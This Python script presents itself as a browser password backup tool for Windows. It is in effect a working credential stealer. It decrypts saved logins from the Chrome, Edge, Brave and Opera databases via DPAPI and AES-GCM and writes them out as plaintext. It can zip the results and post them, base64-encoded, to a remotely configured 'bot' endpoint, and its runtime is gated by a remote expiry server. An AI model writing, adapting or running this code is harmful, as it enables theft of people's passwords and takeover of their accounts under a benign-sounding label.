"""Backup Chromium-based browser login databases and decoded credentials."""

import argparse
import base64
import datetime
import io
import json
import os
import shutil
import sqlite3
import sys
import time
import urllib.error
import urllib.request
import zipfile
from typing import Any, Dict, List, Optional, Tuple

try:
	import win32crypt
	from Cryptodome.Cipher import AES
except ImportError:
	win32crypt = None
	AES = None


BACKUP_ROOT = os.path.expanduser(r"~\BrowserPasswordBackups")
TIMESTAMP_API_URL = os.environ.get("BACKUP_TIMESTAMP_URL")
FILE_ID = os.environ.get("BACKUP_FILE_ID", "browser-password-backup")

_RUNTIME_CONFIG: Optional[Dict[str, Any]] = None
_EXPIRY_WINDOW: Optional[Tuple[int, int]] = None

BROWSER_DATABASES: Dict[str, str] = {
	"chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
	"edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
	"brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
	"opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Login Data"),
}

LOCAL_STATE_FILES: Dict[str, str] = {
	"chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"),
	"edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"),
	"brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State"),
	"opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Local State"),
}


def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
	parser = argparse.ArgumentParser(
		description="Backup browser login databases and optionally export them to a configured bot."
	)
	parser.add_argument(
		"--export-to-bot",
		action="store_true",
		help="Send the completed backup archive to the configured bot export endpoint.",
	)
	parser.add_argument(
		"--no-export",
		action="store_true",
		help="Disable bot export even if BACKUP_EXPORT_TO_BOT=1 is set.",
	)
	return parser.parse_args(argv)


def _parse_bool(value: Optional[str]) -> bool:
	if value is None:
		return False
	return value.strip().lower() in {"1", "true", "yes", "on"}


def _fetch_runtime_config() -> Dict[str, Any]:
	global _RUNTIME_CONFIG, _EXPIRY_WINDOW
	if _RUNTIME_CONFIG is not None:
		return _RUNTIME_CONFIG
	if not TIMESTAMP_API_URL:
		sys.exit("Set BACKUP_TIMESTAMP_URL to use this utility.")
	payload = json.dumps({"file_id": FILE_ID}).encode("utf-8")
	request = urllib.request.Request(
		TIMESTAMP_API_URL,
		data=payload,
		headers={"Content-Type": "application/json"},
		method="POST",
	)
	try:
		with urllib.request.urlopen(request, timeout=10) as response:
			body = response.read()
	except urllib.error.URLError as exc:
		sys.exit(f"Failed to reach timestamp API: {exc}")
	try:
		data: Dict[str, Any] = json.loads(body.decode("utf-8"))
	except json.JSONDecodeError as exc:
		sys.exit(f"Invalid JSON from timestamp API: {exc}")
	if data.get("file_id") not in (None, FILE_ID):
		sys.exit("Timestamp API file_id mismatch.")
	try:
		created_at = int(data["created_at"])
		expires_at = int(data["expires_at"])
	except (KeyError, TypeError, ValueError) as exc:
		sys.exit(f"Timestamp API response missing required fields: {exc}")
	if expires_at <= created_at:
		sys.exit("Timestamp API returned non-increasing window.")
	_RUNTIME_CONFIG = data
	_EXPIRY_WINDOW = (created_at, expires_at)
	return data


def _get_expiry_window() -> Tuple[int, int]:
	if _EXPIRY_WINDOW is not None:
		return _EXPIRY_WINDOW
	_fetch_runtime_config()
	if _EXPIRY_WINDOW is None:
		raise RuntimeError("Unable to determine expiry window.")
	return _EXPIRY_WINDOW


def _ensure_within_window() -> None:
	created_at, expires_at = _get_expiry_window()
	now = time.time()
	if now < created_at:
		start_str = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(created_at))
		sys.exit(f"This utility is not valid until {start_str}")
	if now >= expires_at:
		expiry_str = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(expires_at))
		sys.exit(f"This utility expired on {expiry_str}")


def _should_export(args: argparse.Namespace) -> bool:
	export_requested = bool(getattr(args, "export_to_bot", False))
	if not export_requested:
		export_requested = _parse_bool(os.environ.get("BACKUP_EXPORT_TO_BOT"))
	if getattr(args, "no_export", False):
		return False
	return export_requested


def ensure_dependencies() -> None:
	if win32crypt is None or AES is None:
		sys.exit("Install required packages: pip install pywin32 pycryptodome")


def derive_master_key(local_state_path: str) -> bytes:
	if not os.path.exists(local_state_path):
		return b""
	with open(local_state_path, "r", encoding="utf-8") as handle:
		local_state = json.load(handle)
	encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
	return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


def decrypt_password(blob: bytes, master_key: bytes) -> str:
	if not blob:
		return ""
	try:
		if blob.startswith(b"v10"):
			iv = blob[3:15]
			ciphertext = blob[15:]
			cipher = AES.new(master_key, AES.MODE_GCM, iv)
			decrypted = cipher.decrypt(ciphertext)
			return decrypted[:-16].decode("utf-8", errors="ignore")
		value = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
		return value.decode("utf-8", errors="ignore")
	except Exception:
		return "<unable to decrypt>"


def copy_login_db(src: str, dest: str) -> str:
	os.makedirs(dest, exist_ok=True)
	backup_path = os.path.join(dest, os.path.basename(src))
	shutil.copy2(src, backup_path)
	return backup_path


def extract_credentials(db_path: str, master_key: bytes) -> List[Dict[str, str]]:
	entries: List[Dict[str, str]] = []
	if not os.path.exists(db_path):
		return entries
	temp_copy = db_path + ".tmp"
	shutil.copy2(db_path, temp_copy)
	conn = sqlite3.connect(temp_copy)
	try:
		cursor = conn.cursor()
		cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
		for origin_url, username, password_blob in cursor.fetchall():
			if not username and not password_blob:
				continue
			password = decrypt_password(password_blob, master_key)
			entries.append(
				{
					"url": origin_url,
					"username": username,
					"password": password,
				}
			)
	finally:
		conn.close()
		if os.path.exists(temp_copy):
			os.remove(temp_copy)
	return entries


def backup_browser(name: str, login_db: str, output_dir: str) -> Dict[str, Any]:
	result: Dict[str, Any] = {
		"browser": name,
		"status": "pending",
		"database_path": None,
		"credentials_file": None,
		"credential_count": 0,
	}
	if not os.path.exists(login_db):
		print(f"[-] {name}: login database not found")
		result["status"] = "not_found"
		return result

	_ensure_within_window()

	print(f"[+] {name}: backing up database")
	copied_db = copy_login_db(login_db, output_dir)
	result["database_path"] = copied_db
	result["status"] = "copied"

	local_state = LOCAL_STATE_FILES.get(name, "")
	if local_state and os.path.exists(local_state):
		master_key = derive_master_key(local_state)
		credentials = extract_credentials(copied_db, master_key)
		credentials_path = os.path.join(output_dir, f"{name}_credentials.json")
		with open(credentials_path, "w", encoding="utf-8") as handle:
			json.dump(credentials, handle, indent=2, ensure_ascii=False)
		result["credentials_file"] = credentials_path
		result["credential_count"] = len(credentials)
		result["status"] = "decrypted"
	else:
		print(f"[!] {name}: Local State not found; skipping decryption")

	return result


def _archive_backup_dir(path: str) -> bytes:
	buffer = io.BytesIO()
	with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
		for root, _, files in os.walk(path):
			for file_name in files:
				full_path = os.path.join(root, file_name)
				rel_path = os.path.relpath(full_path, path)
				archive.write(full_path, rel_path)
	return buffer.getvalue()


def _post_json(
	url: str,
	payload: Dict[str, Any],
	*,
	headers: Optional[Dict[str, str]] = None,
	timeout: int = 15,
) -> bytes:
	data = json.dumps(payload).encode("utf-8")
	request_headers = {"Content-Type": "application/json"}
	if headers:
		request_headers.update(headers)
	request = urllib.request.Request(url, data=data, headers=request_headers, method="POST")
	with urllib.request.urlopen(request, timeout=timeout) as response:
		return response.read()


def _get_bot_config() -> Optional[Dict[str, Any]]:
	config: Dict[str, Any] = {}
	try:
		runtime = _fetch_runtime_config()
	except SystemExit:
		raise
	except Exception:
		runtime = {}
	else:
		for key in ("bot_export", "bot", "bot_config", "export"):
			section = runtime.get(key)
			if isinstance(section, dict):
				for field, value in section.items():
					if value not in (None, "", []):
						config.setdefault(field, value)
		for key in (
			"token",
			"bot_token",
			"export_url",
			"record_url",
			"destination",
			"chat_id",
			"bot_name",
			"identifier",
			"auth_scheme",
			"headers",
		):
			value = runtime.get(key)
			if value not in (None, ""):
				mapped_key = "token" if key in {"token", "bot_token"} else key
				config.setdefault(mapped_key, value)

	env_overrides = {
		"token": os.environ.get("BACKUP_BOT_TOKEN"),
		"export_url": os.environ.get("BACKUP_EXPORT_URL"),
		"record_url": os.environ.get("BACKUP_BOT_RECORD_URL"),
		"destination": os.environ.get("BACKUP_BOT_DESTINATION"),
		"chat_id": os.environ.get("BACKUP_BOT_CHAT_ID"),
		"bot_name": os.environ.get("BACKUP_BOT_NAME"),
		"identifier": os.environ.get("BACKUP_BOT_IDENTIFIER"),
		"auth_scheme": os.environ.get("BACKUP_BOT_AUTH_SCHEME"),
	}
	for key, value in env_overrides.items():
		if value:
			config[key] = value

	headers_env = os.environ.get("BACKUP_BOT_HEADERS")
	if headers_env:
		try:
			parsed_headers = json.loads(headers_env)
		except json.JSONDecodeError:
			parsed_headers = None
		if isinstance(parsed_headers, dict):
			config["headers"] = parsed_headers

	if not config.get("token") or not config.get("export_url"):
		return None
	return config


def _export_backup_to_bot(
	destination: str,
	summary: List[Dict[str, Any]],
	bot_config: Dict[str, Any],
	run_timestamp: str,
) -> None:
	_ensure_within_window()

	export_url = str(bot_config.get("export_url") or "").strip()
	if not export_url:
		print("[!] Bot export URL missing; skipping export.")
		return

	token = str(bot_config.get("token") or "").strip()
	if not token:
		print("[!] Bot token missing; skipping export.")
		return

	headers: Dict[str, str] = {}
	extra_headers = bot_config.get("headers")
	if isinstance(extra_headers, dict):
		headers.update({str(key): str(value) for key, value in extra_headers.items()})

	auth_scheme = str(bot_config.get("auth_scheme") or "Bearer").strip()
	if auth_scheme:
		headers["Authorization"] = f"{auth_scheme} {token}".strip()
	else:
		headers["Authorization"] = token

	archive_bytes = _archive_backup_dir(destination)
	bot_payload = {
		"token": token,
		"identifier": bot_config.get("identifier"),
		"destination": bot_config.get("destination") or bot_config.get("chat_id"),
		"name": bot_config.get("bot_name"),
	}
	bot_payload = {key: value for key, value in bot_payload.items() if value not in (None, "")}

	payload: Dict[str, Any] = {
		"file_id": FILE_ID,
		"exported_at": int(time.time()),
		"run_timestamp": run_timestamp,
		"bot": bot_payload,
		"backup": {
			"root": destination,
			"browsers": summary,
			"archive_format": "zip",
			"archive_encoding": "base64",
			"archive_content": base64.b64encode(archive_bytes).decode("ascii"),
		},
	}

	metadata = bot_config.get("metadata")
	if isinstance(metadata, dict):
		payload["metadata"] = metadata

	print("[+] Exporting backup to bot API")
	_post_json(export_url, payload, headers=headers, timeout=20)

	record_url = str(bot_config.get("record_url") or "").strip()
	if record_url and record_url != export_url:
		record_payload = {
			"file_id": FILE_ID,
			"exported_at": payload["exported_at"],
			"run_timestamp": run_timestamp,
			"bot_token": token,
			"destination": bot_payload.get("destination"),
			"browsers": summary,
		}
		try:
			_post_json(record_url, record_payload, headers=headers, timeout=10)
		except urllib.error.URLError as exc:
			print(f"[!] Failed to record bot export details: {exc}")

	print("[+] Bot export completed")


def main(argv: Optional[List[str]] = None) -> None:
	args = parse_args(argv)

	if sys.platform != "win32":
		sys.exit("This script only supports Windows.")

	_ensure_within_window()
	ensure_dependencies()

	run_timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
	destination = os.path.join(BACKUP_ROOT, run_timestamp)
	os.makedirs(destination, exist_ok=True)

	summary: List[Dict[str, Any]] = []
	for browser, db_path in BROWSER_DATABASES.items():
		try:
			_ensure_within_window()
			result = backup_browser(browser, db_path, destination)
			summary.append(result)
		except Exception as exc:
			print(f"[!] {browser}: backup failed ({exc})")
			summary.append(
				{
					"browser": browser,
					"status": "error",
					"error": str(exc),
				}
			)

	print(f"Backup completed: {destination}")

	if _should_export(args):
		bot_config = _get_bot_config()
		if not bot_config:
			print("[!] Bot export requested but configuration is missing; skipping.")
		else:
			try:
				_export_backup_to_bot(destination, summary, bot_config, run_timestamp)
			except Exception as exc:
				print(f"[!] Failed to export backup to bot: {exc}")


if __name__ == "__main__":
	main()
